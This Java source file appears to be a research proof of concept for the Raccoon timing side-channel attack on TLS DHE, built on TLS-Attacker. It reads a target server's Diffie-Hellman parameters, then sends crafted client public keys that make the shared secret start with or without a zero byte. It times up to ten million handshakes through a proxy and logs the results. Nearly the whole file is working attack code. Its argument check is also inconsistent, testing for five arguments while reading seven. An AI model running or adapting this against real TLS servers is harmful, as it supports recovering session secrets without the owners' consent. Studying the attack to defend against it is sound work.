/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.raccoon;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.DHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveTillAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.transport.TransportHandlerType;
import de.rub.nds.tlsattacker.transport.tcp.proxy.TimingProxyClientTcpTransportHandler;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.math.BigInteger;
import java.security.Security;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

public class Main {

    public static void main(String args[]) throws IOException {
        if (args.length != 5) {
            System.out.println("usage: [host] [port] [version] [control host] [control port] [data host] [data port] ");
        }
        Security.addProvider(new BouncyCastleProvider());

        Config config = Config.createConfig();
        //Make sure to add BouncyCastle as a security provider
        //we specify where we want to connect to
        //you can change the runningmode to server and adjust the defaultServerConnection if you 
        //want to run TLS-Attacker as a server
        config.setDefaultRunningMode(RunningModeType.CLIENT);
        config.getDefaultClientConnection().setHostname(args[0]);
        config.getDefaultClientConnection().setPort(Integer.parseInt(args[1]));
        config.getDefaultClientConnection().setProxyControlHostname(args[3]);
        config.getDefaultClientConnection().setProxyControlPort(Integer.parseInt(args[4]));
        config.getDefaultClientConnection().setProxyDataHostname(args[5]);
        config.getDefaultClientConnection().setProxyDataPort(Integer.parseInt(args[6]));
        config.setDefaultClientSupportedCipherSuites(CipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384);
        config.setDefaultServerSupportedCipherSuites(CipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384);
        config.setDefaultSelectedCipherSuite(CipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384);
        config.setHighestProtocolVersion(ProtocolVersion.valueOf(args[2]));
        config.getDefaultClientConnection().setTimeout(25);
        config.getDefaultClientConnection().setTransportHandlerType(TransportHandlerType.TCP_PROXY_TIMING);
        config.setQuickReceive(true);


        System.out.println("starting init phase...");
        WorkflowTrace trace = new WorkflowTrace();
        trace.addTlsAction(new SendAction(new ClientHelloMessage(config)));
        trace.addTlsAction(new ReceiveTillAction(new ServerHelloDoneMessage(config)));
        trace.addTlsAction(new SendAction(new DHClientKeyExchangeMessage(config)));
        State state = new State(config, trace);
        WorkflowExecutor executor = new DefaultWorkflowExecutor(state);
        executor.executeWorkflow();
        BigInteger generator = state.getTlsContext().getServerDhGenerator();
        BigInteger modulus = state.getTlsContext().getServerDhModulus();
        BigInteger serverPk = state.getTlsContext().getServerDhPublicKey();
        System.out.println("Finished init phase...");
        System.out.println("Modulus:" + modulus);
        System.out.println("Generator:" + generator);
        System.out.println("ServerPk:" + serverPk);
        System.out.println("ClientPk:" + state.getTlsContext().getClientDhPublicKey());

        System.out.println("StartTime:" + System.currentTimeMillis());
        testSideChannel(generator, serverPk, modulus, config);
        System.out.println("EndTime: " + System.currentTimeMillis());
    }

    public static int getIndexWhichWillGiveNZeroBytes(int n, int startPosition, BigInteger serverPk, BigInteger modulus, BigInteger generator) {

        int numberLeadingZero;
        do {
            startPosition++;
            BigInteger sharedSecret = serverPk.modPow(new BigInteger("" + startPosition), modulus);
            numberLeadingZero = getNumberLeadingZero(sharedSecret, modulus);

        } while (numberLeadingZero != n);
        return startPosition;
    }

    public static BigInteger getPkWhichWillGiveNZeroBytes(int n, int startPosition, BigInteger serverPk, BigInteger modulus, BigInteger generator) {

        int numberLeadingZero;
        do {
            startPosition++;
            BigInteger sharedSecret = serverPk.modPow(new BigInteger("" + startPosition), modulus);
            numberLeadingZero = getNumberLeadingZero(sharedSecret, modulus);

        } while (numberLeadingZero != n);
        return generator.modPow(new BigInteger("" + startPosition), modulus);
    }

    public static Long meassureTrace(Config config, BigInteger ckeMsg, int modLength) {
        WorkflowTrace trace = new WorkflowTrace();
        trace.addTlsAction(new SendAction(new ClientHelloMessage(config)));
        trace.addTlsAction(new ReceiveTillAction(new ServerHelloDoneMessage()));
        DHClientKeyExchangeMessage dhCke = new DHClientKeyExchangeMessage(config);
        dhCke.setPublicKey(Modifiable.explicit(ArrayConverter.bigIntegerToNullPaddedByteArray(ckeMsg, modLength)));
        //Now lets send an client key exchange message + ccs + finished
        SendAction sendAction = new SendAction(dhCke, new ChangeCipherSpecMessage(config), new FinishedMessage(config));
        trace.addTlsAction(sendAction);
        //Lets see what the other party has to say about this
        trace.addTlsAction(new ReceiveAction(new AlertMessage()));
        //Lets execute the Trace
        State state = new State(config, trace);
        WorkflowExecutor executor = new DefaultWorkflowExecutor(state);

        boolean success = false;
        do {
            try {
                executor.executeWorkflow();
                success = true;
            } catch (Exception E) {
                E.printStackTrace();
            }
        } while (!success);

        Long lastMeasurement = ((TimingProxyClientTcpTransportHandler) (state.getTlsContext().getTransportHandler())).getLastMeasurement();
        return lastMeasurement;
    }

    public static int getNumberLeadingZero(BigInteger sharedSecret, BigInteger modulus) {
        byte[] sharedSecretBytes = ArrayConverter.bigIntegerToNullPaddedByteArray(sharedSecret, ArrayConverter.bigIntegerToByteArray(modulus).length);
        int j = 0;
        for (int i = 0; i < sharedSecretBytes.length; i++) {
            if (sharedSecretBytes[i] == 0) {
                j++;
            } else {
                return j;
            }
        }
        return j;
    }

    public static void testSideChannel(BigInteger generator, BigInteger serverPk, BigInteger modulus, Config config) throws IOException {
        FileWriter writer = null;
        try {
            writer = new FileWriter(new File("results.log"));
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
        System.out.println("Results are written to results.log");
        System.out.println("Syntax: index,zeroByte label,time");

        BigInteger noZeroByte;
        BigInteger zeroByte;
        Random r = new Random();
        int j = 0;
        for (int i = 0; i < 10000000; i++) {
            if (r.nextBoolean()) {
                try {
                    zeroByte = getPkWhichWillGiveNZeroBytes(1, r.nextInt(), serverPk, modulus, generator);

                    Long time = meassureTrace(config, zeroByte, modulus.bitLength() / 8);
                    writer.write("" + j + ";" + "one" + ";" + time + "\n");
                    j++;
                    noZeroByte = getPkWhichWillGiveNZeroBytes(0, r.nextInt(), serverPk, modulus, generator);

                    time = meassureTrace(config, noZeroByte, modulus.bitLength() / 8);
                    writer.write("" + j + ";" + "nothing" + ";" + time + "\n");
                    j++;
                } catch (IOException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                }

            } else {
                try {
                    noZeroByte = getPkWhichWillGiveNZeroBytes(0, r.nextInt(), serverPk, modulus, generator);

                    Long time = meassureTrace(config, noZeroByte, modulus.bitLength() / 8);
                    writer.write("" + j + ";" + "nothing" + ";" + time + "\n");
                    j++;
                    zeroByte = getPkWhichWillGiveNZeroBytes(1, r.nextInt(), serverPk, modulus, generator);

                    time = meassureTrace(config, zeroByte, modulus.bitLength() / 8);
                    writer.write("" + j + ";" + "one" + ";" + time + "\n");
                    j++;
                } catch (IOException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
        writer.close();
    }
}
